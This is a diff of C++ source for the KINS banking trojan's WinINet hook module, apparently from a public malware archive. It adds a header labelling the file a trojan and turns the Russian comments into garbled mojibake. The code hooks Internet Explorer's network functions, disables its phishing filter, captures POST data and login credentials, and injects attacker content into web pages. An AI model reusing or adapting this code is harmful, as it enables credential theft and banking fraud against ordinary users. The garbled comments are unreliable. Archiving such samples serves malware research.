@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <wininet.h>
@@ -34,20 +45,20 @@
 #define CACHE_ALIGN __declspec(align(CACHE_LINE))
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Таблица соединений.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 typedef struct
 {
-	HINTERNET handle;                     //Хэндл соединения.
-	HANDLE readEvent;                     //События чтения (при инжекте).
+	HINTERNET handle;                     //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	HANDLE readEvent;                     //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ).
 
-	HttpGrabber::INJECTFULLDATA *injects; //Список ижектов, применяемых для соединения.
-	DWORD injectsCount;                   //Кол. элементов в injects.
+	HttpGrabber::INJECTFULLDATA *injects; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DWORD injectsCount;                   //пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ injects.
 
-	LPBYTE context;                       //Подмененное содержимое.
-	DWORD contentSize;                    //Размер содержимого. Если равно ((DWORD)-1), то данные есче не считаны.
-	DWORD contentPos;                     //Позиция в содержимом.
+	LPBYTE context;                       //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DWORD contentSize;                    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ ((DWORD)-1), пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	DWORD contentPos;                     //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	bool bCaptcha;                        // indicates if request is for captcha or not
 	bool bIsCaptchaSent;                  // indicates if bot already sent current captcha to server
@@ -122,7 +133,7 @@ static WININETCONNECTION * connectionAdd(HINTERNET handle)
 	if(newNode)
 		newConnection = &newNode->wininetconn;
 		
-	//Заполняем.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(newConnection != NULL)
 	{
 		newConnection->handle         = handle;
@@ -218,7 +229,7 @@ static DWORD WINAPI initIE(void)
 {
 	if(coreDllData.integrityLevel > Process::INTEGRITY_LOW)
 	{
-		//Отключение фишинг фильтра.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		{
 			CSTR_GETW(key, regpath_ie_phishingfilter);
 			CSTR_GETW(var1, regvalue_ie_phishingfilter1);
@@ -278,14 +289,14 @@ void WininetHook::uninit(void)
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Инжекты.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 /*
-	Установка хука на InternetStatusCallback для хэндла и его родителей.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ InternetStatusCallback пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	IN handle - HINTERNET.
-	IN hooker - функция-перехватчик с прототипом InternetStatusCallbacks.
+	IN hooker - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ InternetStatusCallbacks.
 */
 static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 {
@@ -302,7 +313,7 @@ static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 			//FIXME:
 		}
 
-		//Получаем родителя.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		size = sizeof(HINTERNET);
 		ok   = CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_PARENT_HANDLE, &parentHandle, &size);
 		if(ok == FALSE || parentHandle == NULL)break;
@@ -310,10 +321,10 @@ static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
 	}
 }
 
-#define READCONTEXT_BUFFER_SIZE 4096 //Буфер чтения для readAllContext().
+#define READCONTEXT_BUFFER_SIZE 4096 //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ readAllContext().
 
 /*
-	Кэллбэк для readAllContext().
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ readAllContext().
 */
 static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength)
 {
@@ -329,24 +340,24 @@ static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR contex
 }
 
 /*
-	Чтение всего контекста в буфер.
+	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-	IN request      - запрос.
-	IN readEvent    - событие ассоциированое с соединением.
-	OUT context     - буфер.
-	OUT contentSize - размер буфера.
+	IN request      - пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN readEvent    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	OUT context     - пїЅпїЅпїЅпїЅпїЅ.
+	OUT contentSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	Retrun          - true - в случаи успеха,
-	false - в случаи ошибки.
+	Retrun          - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+	false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context, LPDWORD contentSize)
 {
 	INTERNET_STATUS_CALLBACK oldCallback;
 	LPBYTE buffer;
 
-	//Создаем основные объекты.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
-		CWA(kernel32, ResetEvent)(readEvent); //Параноя.
+		CWA(kernel32, ResetEvent)(readEvent); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 		if((buffer = (LPBYTE)Mem::alloc(READCONTEXT_BUFFER_SIZE)) == NULL)
 		{
@@ -354,7 +365,7 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 			return false;
 		}
 
-		//Подменяем данные соединения.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		{  
 			DWORD size = sizeof(DWORD_PTR);
 			oldCallback = CWA(wininet, InternetSetStatusCallback)(request, readAllContextCallback);
@@ -364,7 +375,7 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 		*contentSize = 0;
 	}
 
-	//Читаем.
+	//пїЅпїЅпїЅпїЅпїЅпїЅ.
 	bool ok = true;
 	{
 		INTERNET_BUFFERSA internetBuffer;
@@ -381,9 +392,9 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 				if(CWA(kernel32, GetLastError)() == ERROR_IO_PENDING)
 				{
 					/*
-						Вообщем это место является больным, т.к. в этот преуд программа этажом выше просто
-						сбивает нашу readAllContextCallback(). И мы не когда не получем сигнал от события.
-						Нужно найти способ избваиться от InternetSetStatusCallback().
+						пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+						пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ readAllContextCallback(). пїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+						пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ InternetSetStatusCallback().
 					*/
 					Sync::_waitForMultipleObjectsAndDispatchMessages(1, &readEvent, false, INFINITE);
 					continue;
@@ -393,23 +404,23 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 				break;
 			}
 
-			//Весь контекст прочитан.
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(internetBuffer.dwBufferLength == 0)break;
 
-			//Выделяем память
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if(!Mem::reallocEx(context, *contentSize + internetBuffer.dwBufferLength))
 			{
 				ok = false;
 				break;
 			}
 
-			//Копируем.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			Mem::_copy(*context + *contentSize, buffer, internetBuffer.dwBufferLength);
 			*contentSize += internetBuffer.dwBufferLength;
 		}
 	}
 
-	//Уничтожаем основные объекты.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
 		CWA(wininet, InternetSetStatusCallback)(request, oldCallback == INTERNET_INVALID_STATUS_CALLBACK ? NULL : oldCallback);
 		Mem::free(buffer);
@@ -420,15 +431,15 @@ static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context,
 }
 
 /*
-	Операции производимые в момент чтения HTTP-ответа.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	IN OUT request         - хэндл запроса.
-	OUT buffer             - буфер для считаных данных. NULL - для возврата достпуного размера.
-	IN numberOfBytesToRead - размер буфера.
-	OUT numberOfBytesRead  - кол. прочитаных байт.
+	IN OUT request         - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	OUT buffer             - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. NULL - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN numberOfBytesToRead - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	OUT numberOfBytesRead  - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
-	Return                 - (-1) - вызвать стандартную функцию чтения.
-	В другом случаи, вернуть вместо вызова стандартной функции, это значение.
+	Return                 - (-1) - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesRead)
 {
@@ -451,7 +462,7 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 				ok = readAllContext(*request, readEvent, &contextBuffer, &contextBufferSize);
 			}
 
-			//Переполучаем данные соединения.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(ok == false || !wc)
 			{
 				if(ok)Mem::free(contextBuffer);
@@ -555,20 +566,20 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 		{
 			if(numberOfBytesRead != NULL)*numberOfBytesRead = 0;
 
-			//Инжект еще не применен.
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(wc->contentSize == (DWORD)-1)
 			{
 				LPBYTE contextBuffer;
 				DWORD contextBufferSize;
 
-				//Читаем и подменяем содержимое.
+				//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				bool ok;
 				{
 					HANDLE readEvent = wc->readEvent;
 					ok = readAllContext(*request, readEvent, &contextBuffer, &contextBufferSize);
 				}
 
-				//Переполучаем данные соединения.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				if(ok == false || !wc)
 				{
 					if(ok)Mem::free(contextBuffer);
@@ -581,7 +592,7 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 					LPSTR url = (LPSTR)Wininet::_queryOptionExA(*request, INTERNET_OPTION_URL, &urlSize);
 					if(HttpGrabber::_executeInjects(url, &contextBuffer, &contextBufferSize, wc->injects, wc->injectsCount))
 					{
-						//Подменяем кэш.              
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.              
 						LPWSTR urlW = Str::_ansiToUnicodeEx(url, urlSize);
 						if(urlW != NULL)
 						{
@@ -610,7 +621,7 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 				}
 			}
 
-			//Инжект применены, отдаем его результаты.
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(wc->contentSize != (DWORD)-1 && retVal == -1)
 			{
 				DWORD maxSize = wc->contentSize - wc->contentPos;
@@ -636,19 +647,19 @@ static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBy
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////
-// Граббер.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 /*
-	Заполнение HttpGrabber::REQUESTDATA.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HttpGrabber::REQUESTDATA.
 
-	OUT requestData - структура.
-	IN request      - хэндл текущего запроса.
-	IN postData     - POST-данные.
-	IN postDataSize - размер POST-данных.
+	OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN request      - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN postData     - POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN postDataSize - пїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	Return          - true - в случуи успеха,
-	false - в случаи ошибки.
+	Return          - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+	false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET request, const void *postData, DWORD postDataSize)
 {
@@ -656,10 +667,10 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
 
 	requestData->flags = HttpGrabber::RDF_WININET; 
 
-	//Хэндл запроса.
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	requestData->handle = (void *)request;
 
-	//Получем URL.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL.
 	if((requestData->url = (LPSTR)Wininet::_queryOptionExA(request, INTERNET_OPTION_URL, &requestData->urlSize)) == NULL)
 	{
 #   if defined WDEBUG0
@@ -668,10 +679,10 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
 		return false;
 	}
 
-	//Получем реферера.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	requestData->referer = Wininet::_queryInfoExA(request, HTTP_QUERY_REFERER | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->refererSize, NULL);
 
-	//Получем Verb.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Verb.
 	{
 		char verb[10];
 		DWORD verbSize = sizeof(verb) / sizeof(char) - 1;
@@ -689,17 +700,17 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
 		}
 	}
 
-	//Получем Content-Type.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Content-Type.
 	requestData->contentType = Wininet::_queryInfoExA(request, HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->contentTypeSize, NULL);
 
-	//Получаем POST-данные.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE && postData != NULL)
 	{
 		requestData->postData     = (void *)postData;
 		requestData->postDataSize = postDataSize;
 	}
 
-	//Получаем данные авторизации.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
 		bool ok = false;
 		DWORD size;
@@ -719,20 +730,20 @@ static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET req
 		if(!ok)Mem::free(userName);
 	} 
 	
-	//Текущая конфигурация.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	requestData->currentConfig = coreDllData.currentConfig;
 	return true;
 }
 
 /*
-	Операции производимые в момент отправки HTTP-запроса.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	IN request          - запрос.
-	IN OUT postData     - POST-данные.
-	IN OUT postDataSize - размер postData.
+	IN request          - пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN OUT postData     - POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
+	IN OUT postDataSize - пїЅпїЅпїЅпїЅпїЅпїЅ postData.
 
-	Return              - (-1) - вызвать стандартную функцию отсылки запроса.
-	В другом случаи, вернуть вместо вызова стандартной функции, это значение.
+	Return              - (-1) - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDataSize)
 {
@@ -778,7 +789,7 @@ static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDat
 				}
 				else
 				{
-					//Старые инжекты могу сущестовать, т.к. один запрос можно послать несколько раз.
+					//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
 					HttpGrabber::_freeInjectFullDataList(wc->injects, wc->injectsCount);
 					Mem::free(wc->context);
 
@@ -875,10 +886,10 @@ BOOL WINAPI WininetHook::hookerInternetCloseHandle(HINTERNET handle)
 	WDEBUG0(WDDT_INFO, "Called");
 #endif
 
-	//Закрытие хэндла прерывает чтение данных из других потоков.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	BOOL r = CWA(wininet, InternetCloseHandle)(handle);
 
-	if(DllCore::isActive())//Возможна небольшая утечка памяти.
+	if(DllCore::isActive())//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	{
 		WININETCONNECTION *wc = connectionFind(handle);
 		if(wc)
